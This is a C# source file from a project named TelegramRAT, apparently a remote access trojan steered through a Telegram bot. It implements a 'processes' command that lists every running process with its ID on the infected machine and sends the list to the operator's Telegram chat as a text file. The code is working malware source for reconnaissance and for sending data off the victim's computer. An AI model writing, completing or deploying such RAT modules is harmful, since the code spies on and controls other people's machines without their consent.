using Telegram.Bot;
using System.Text;
using System.Diagnostics;
using System.Net;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.System;

public class ProcessesCommand(ITelegramBotClient botClient, IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "processes";
    public override string[] Aliases => new[] { "prcss" };
    public override string Description => "Get list of running processes.";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            using MemoryStream ms = new MemoryStream();
            using StreamWriter sw = new StreamWriter(ms, Encoding.UTF8, 1024, leaveOpen: true);
            sw.WriteLine("List of processes: ");
            
            Process[] processCollection = Process.GetProcesses();

            foreach (Process p in processCollection.OrderBy(p => p.ProcessName))
            {
                sw.WriteLine($"{p.ProcessName} : {p.Id}");
            }
            
            await sw.FlushAsync();
            ms.Position = 0;

            await botClient.SendDocument(
                chatId: model.Message.Chat.Id,
                document: new Telegram.Bot.Types.InputFileStream(ms, "processes.txt"),
                caption: "List of running processes.",
                replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId }
            );
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
